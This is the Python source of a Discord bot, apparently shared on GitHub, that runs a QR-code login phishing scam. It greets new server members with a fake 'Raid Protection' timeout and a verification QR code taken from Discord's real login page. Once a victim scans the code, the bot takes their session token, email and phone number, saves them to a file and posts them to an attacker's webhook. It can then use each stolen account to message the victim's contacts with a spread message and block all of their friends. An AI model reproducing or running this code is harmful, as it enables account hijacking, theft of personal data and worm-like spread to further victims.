#                         Made By Bounty#4221                        #
#               Creds to NightfallGT For Grabbing Base               #


import discord.ext, os, time, requests, json, threading, base64

from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from morefunc import lgbtqprint, CheckWebHook
from timeout import timeout_user
from discord.ext import commands
from selenium import webdriver
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore
from PIL import Image



#################################
#JSON VARS
setupjsonfile = json.load(open("setup.json"))

DISCORD_BOT_TOKEN = setupjsonfile["token"]
DISCORD_WEBHOOK = setupjsonfile["webhook"]
BOT_GUILD = setupjsonfile["guild_id"]
SEND_TO_WEBHOOK_BOOL = bool(setupjsonfile["send_to_webhook"])
PRINT_USER_INFO_BOOL = bool(setupjsonfile["print_user_info"])
AUTO_SPREAD_BOOL = bool(setupjsonfile["auto_spread"])
PRINT_SENDED_QR_CODE_USER_NAME_BOOL = bool(setupjsonfile["print_user_sended_qr"])
DISCORD_ROLE_NAME = setupjsonfile["name_of_role"]
GIVE_ROLE_BOOL = bool(setupjsonfile["give_role"])
SPREAD_MESSAGE_ = setupjsonfile["spread_message"]
##################################

##################################
#INIT DISCORD BOT
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
###################################

# Vars to cache Tokens and user ids so no double tokens
TokenArray = []
UserIdArray = []

def init():
    tag = f"""
{Fore.RED}          _    _ _______ _____  _____ __  __
{Fore.YELLOW}     /\  | |  | |__   __|_   _|/ ____|  \/  |
{Fore.GREEN}    /  \ | |  | |  | |    | | | (___ | \  / |
{Fore.BLUE}   / /\ \| |  | |  | |    | |  \___ \| |\/| |
{Fore.CYAN}  / ____ \ |__| |  | |   _| |_ ____) | |  | |
{Fore.MAGENTA} /_/    \_\____/   |_|  |_____|_____/|_|  |_|"""

    os.system("cls")
    print(tag)
    lgbtqprint("        https://github.com/BountyThaBoy")
    lgbtqprint("----------------------------------------------")
    print("""""")

def spread_message(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=15)
    if src.status_code != 403 or 401:
        dmIDS = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        if (dmIDS):
            for dm in dmIDS:
                for user in [x["username"] + "#" + x["discriminator"] for x in dm["recipients"]]:
                    try:
                        requests.post(f'https://discord.com/api/v9/channels/' + dm['id'] + '/messages',
                            headers={'Authorization': token},
                            data={"content": SPREAD_MESSAGE_})
                    except Exception as e:
                        print(f"{Fore.RED} Error: {e}")

        dmIDS = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        if (dmIDS):
            for dm in dmIDS:
                try:
                    # Close DM
                    requests.delete(f'https://discord.com/api/v7/channels/' + dm['id'],
                        headers=headers)
                except Exception as e:
                    print(f"{Fore.RED} Error: {e}")

        FriendIDs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        if(FriendIDs):
            for friend in FriendIDs:
                try:
                    # block all friends they have
                    requests.put(f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'], headers=headers, json={"type": 2})

                except Exception as e:
                    print(f"{Fore.RED} Error: {e}")


def grabqrcodetoken(driver, cururl):
        while driver.current_url == cururl:
            if driver.current_url != cururl:
                script = '''
                    window.dispatchEvent(new Event('beforeunload'));
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    let localStorage = iframe.contentWindow.localStorage;
                    var token = JSON.parse(localStorage.token);
                    return token;
                    '''
                token = driver.execute_script(script + f"\ngettoken()")
                driver.close()

                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                }
                src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=15)
                response = json.loads(src.content)
                if response['id'] not in UserIdArray:
                    UserIdArray.append(response['id'])
                    TokenArray.append(token)
                    with open("Tokens.txt", "a") as tokenfile:
                        tokenfile.write("\n" + token)
                        tokenfile.close()
                    
                    currenttime = datetime.now()
                    nowtime = currenttime.strftime("%H:%M:%S")
                    print(f"{Fore.RED}[{Fore.WHITE}{nowtime}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}GRABBED TOKEN{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{token}{Fore.RED}]{Fore.WHITE} {Fore.RESET}")

                    if(PRINT_USER_INFO_BOOL):
                        nitrores = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = nitrores.json()
                        currenttime = datetime.now()
                        nowtime = currenttime.strftime("%H:%M:%S")
                        print(f"{Fore.RED}[{Fore.WHITE}{nowtime}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}TOKEN INFO{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{response['username']}#{response['discriminator']}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}NITRO : {bool(len(nitro_data) > 0)}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{response['email']}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{response['phone']}{Fore.RED}]{Fore.WHITE}" + Fore.RESET)

                    if(SEND_TO_WEBHOOK_BOOL):
                        checkedwebhook = CheckWebHook(DISCORD_WEBHOOK)
                        if (checkedwebhook):
                            message = f"""
⛓ **GRABBED NEW TOKEN** ⛓

💳 **Name : {response['username']}#{response['discriminator']}**
💳 **Has Nitro : {bool(len(nitro_data) > 0)}**
📱 **Phone number : {response['phone']}**
✉ **Email : {response['email']}**

🔌 **Token :** (||**{token}**||)

||@everyone||

`- AUTISM BOT`
    """
                            data = json.dumps({
                                "content": message,
                                "username": "AUTISM BOT",
                                "tts": False
                            })
                            

                            header = {
                                "content-type": "application/json"
                            }

                            response = requests.post(checkedwebhook, data, headers=header)

                    if(AUTO_SPREAD_BOOL):
                        threading.Thread(target=spread_message, args=[token]).start()
                break

# Cache All Already existing tokens
with open('Tokens.txt', 'r') as tokens:
    for token in tokens.read().split('\n'):
        if token != "":
            if token not in TokenArray:
                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                }
                src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=15)
                response = json.loads(src.content)
                if response['id'] not in UserIdArray:
                    UserIdArray.append(response['id'])
                TokenArray.append(token)
tokens.close()

init()
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="WICKBOT.COM | SHARD127"))

    currenttime = datetime.now()
    nowtime = currenttime.strftime("%H:%M:%S")
    print(f"{Fore.RED}[{Fore.WHITE}{nowtime}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}STARTED BOT{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{bot.user.name}#{bot.user.discriminator}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{bot.user.id}{Fore.RED}]{Fore.WHITE}{Fore.RESET}")

@bot.event
async def on_member_join(member):
    timeout_user(bot_token=DISCORD_BOT_TOKEN, user_id=member.id, guild_id=BOT_GUILD, until=39999)

    if(GIVE_ROLE_BOOL):
        await member.add_roles(discord.utils.get(member.guild.roles, name=DISCORD_ROLE_NAME))

    try:
        embed = discord.Embed(title=f"You have been timed out! in {bot.get_guild(BOT_GUILD).name}!",
                              description=f"""
    :bust_in_silhouette: **Member:** {member.name}#{member.discriminator}
    :book: **Reason:** Raid Protection

    :white_check_mark: To remove your time out please verify with the QR Code below
    """, colour=0xff0000)
        embed.set_author(name=f"{member.name}", icon_url=member.avatar_url)
        await member.send(embed=embed)
        embed = discord.Embed(title=f":star:Additional Notes", description=f"""
    For this to work u will need a phone :mobile_phone:
    and the Discord Mobile App installed :electric_plug:
    """, colour=0x00ff1a)
        await member.send(embed=embed)

        WINDOW_SIZE = "0,0"
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=%s" % WINDOW_SIZE)
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)
        s = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=s, options=options)
        driver.get('https://discord.com/login')
        time.sleep(2)
        page_source = driver.page_source
        soup = BeautifulSoup(page_source, features='lxml')
        classe = soup.find('div', {'class': 'qrCode-2R7t9S'})
        qrcode = classe.find('img')['src']
        imgbase64 = base64.b64decode(qrcode.replace('data:image/png;base64,', ''))
        with open('temp23.png', 'wb') as f:
            f.write(imgbase64)
        face = Image.open(r'temp\overlay.png')
        img_qr_big = Image.open(r'temp23.png').convert('RGB')
        os.system("del temp23.png /f>nul")
        pos = ((img_qr_big.size[0] - face.size[0]) // 2, (img_qr_big.size[1] - face.size[1]) // 2)
        img_qr_big.paste(face, pos)
        img_qr_big.save("qrcodeverify" + ".png")
        cururl = driver.current_url

        with open("qrcodeverify.png", "rb") as f:
            f = discord.File(f, filename="qrcodeverify.png")
            await member.send(file=f)
            f.close()

            if(PRINT_SENDED_QR_CODE_USER_NAME_BOOL):
                currenttime = datetime.now()
                nowtime = currenttime.strftime("%H:%M:%S")
                print(f"{Fore.RED}[{Fore.WHITE}{nowtime}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}SENDED QR CODE TO{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{member.name}#{member.discriminator}{Fore.RED}]{Fore.WHITE} {Fore.RED}[{Fore.WHITE}{member.id}{Fore.RED}]{Fore.WHITE}{Fore.RESET}")

        threading.Thread(target=grabqrcodetoken, args=[driver, cururl]).start()
    except:
        return 0


bot.run(DISCORD_BOT_TOKEN)